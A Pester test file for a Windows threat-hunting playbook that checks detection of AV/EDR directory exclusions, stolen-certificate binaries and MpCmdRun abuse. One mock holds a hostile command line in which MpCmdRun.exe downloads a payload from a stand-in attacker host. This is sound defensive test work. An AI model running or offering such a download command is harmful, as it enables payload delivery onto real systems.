<#
.SYNOPSIS
    Pester 5 regression guards for four P2 partial blindspots.

    P2-B: BaseExcludedDirs must not exclude AV/EDR product directories
          (CrowdStrike, SentinelOne, Kaspersky, McAfee). Dropping a malicious
          DLL in C:\ProgramData\CrowdStrike\ currently produces no finding.

    P2-C: Signature FP verdict must require -not $publicNet before awarding
          False Positive. Stolen-cert (3CX/SolarWinds) executables making
          external connections must not receive a clean bill of health.

    P2-D: MpCmdRun.exe must NOT be in $lowRiskProcesses. It is a documented
          LOLBin for proxy-downloading payloads (-DownloadFile flag, T1105).
          Explicit detection for the -DownloadFile pattern must also exist.
#>

BeforeAll {
    $Script:FileSrc  = Join-Path $PSScriptRoot '..\..\playbooks\windows\threat_hunting\dev\src\05_File_And_ADS_Hunt.ps1'
    $Script:ProcSrc  = Join-Path $PSScriptRoot '..\..\playbooks\windows\threat_hunting\dev\src\01_Process_And_Injection.ps1'
    $Script:CtxSrc   = Join-Path $PSScriptRoot '..\..\playbooks\windows\threat_hunting\Get-FindingContext.ps1'

    $Script:FileContent = Get-Content -LiteralPath $Script:FileSrc  -Raw
    $Script:ProcContent = Get-Content -LiteralPath $Script:ProcSrc  -Raw
    $Script:CtxContent  = Get-Content -LiteralPath $Script:CtxSrc   -Raw

    # ---- functional test helpers (P2-D) --------------------------------------
    $SrcPath = Join-Path $PSScriptRoot '..\..\playbooks\windows\threat_hunting\dev\src'
    . (Join-Path $SrcPath '00_Parameters_And_Globals.ps1')
    . (Join-Path $SrcPath '01_Process_And_Injection.ps1')
}

# ==============================================================================
# P2-B: BaseExcludedDirs must not exclude AV/EDR product directories
# ==============================================================================
Describe "P2-B: File Hunt -- AV/EDR directories must NOT be excluded" {

    It "BaseExcludedDirs does not exclude CrowdStrike directories" {
        $Script:FileContent | Should -Not -Match '\*CrowdStrike\*'
    }

    It "BaseExcludedDirs does not exclude SentinelOne directories" {
        $Script:FileContent | Should -Not -Match '\*SentinelOne\*'
    }

    It "BaseExcludedDirs does not exclude Kaspersky directories" {
        $Script:FileContent | Should -Not -Match '\*Kaspersky\*'
    }

    It "BaseExcludedDirs does not exclude McAfee directories" {
        $Script:FileContent | Should -Not -Match '\*McAfee\*'
    }
}

# ==============================================================================
# P2-C: Signature -> FP verdict must require -not $publicNet
# ==============================================================================
Describe "P2-C: Adjudicator -- valid+trusted verdict requires no external network activity" {

    It "FP verdict path checks -not publicNet before awarding False Positive" {
        # Stolen-cert (3CX, SolarWinds) binaries may have valid sigs in trusted
        # paths while actively beaconing to C2. The FP verdict must not clear them.
        $Script:CtxContent | Should -Match 'valid.*trusted.*-not.*publicNet|-not.*publicNet.*valid.*trusted'
    }

    It "When publicNet is true the verdict is downgraded from False Positive to Likely False Positive" {
        $Script:CtxContent | Should -Match 'valid.*trusted.*Likely False Positive|Likely False Positive.*valid.*trusted'
    }

    It "Downgrade note mentions stolen or compromised cert" {
        $Script:CtxContent | Should -Match 'stolen|compromised|3CX|SolarWinds'
    }
}

# ==============================================================================
# P2-D: MpCmdRun must not be in lowRiskProcesses; -DownloadFile must be detected
# ==============================================================================
Describe "P2-D: Process Hunt -- MpCmdRun is a LOLBin, not low-risk" {

    It "MpCmdRun.exe is NOT in the lowRiskProcesses list" {
        # Extract only the array body of $lowRiskProcesses and check MpCmdRun is absent.
        # Using -match on the full content would falsely match the detection code added in the fix.
        $null = $Script:ProcContent -match '(?s)\$lowRiskProcesses\s*=\s*@\((.*?)\)'
        $Matches[1] | Should -Not -Match 'MpCmdRun'
    }

    It "Explicit detection for MpCmdRun -DownloadFile (T1105 proxy download) exists before the low-risk filter" {
        $Script:ProcContent | Should -Match 'MpCmdRun.*DownloadFile|DownloadFile.*MpCmdRun'
    }

    It "MpCmdRun -DownloadFile produces a LOLBin Execution finding (functional)" {
        $script:Findings = @()
        Mock Get-Process {
            return @( [PSCustomObject]@{ Id = 9901; ProcessName = 'MpCmdRun' } )
        }
        Mock Get-CimInstance {
            if ($Filter -and $Filter -match '9901') { return $null }
            return @(
                [PSCustomObject]@{
                    ProcessId = 9901; ParentProcessId = 4; Name = 'MpCmdRun.exe'
                    CommandLine = 'MpCmdRun.exe -DownloadFile -url https://evil.example.com/payload.bin -path C:\Windows\Temp\p.bin'
                }
            )
        }
        Invoke-ProcessHunt
        $f = $script:Findings | Where-Object { $_.Type -match 'LOLBin' -and $_.Target -match '9901' }
        $f | Should -Not -BeNullOrEmpty -Because 'MpCmdRun -DownloadFile is T1105 proxy download and must be detected'
    }
}
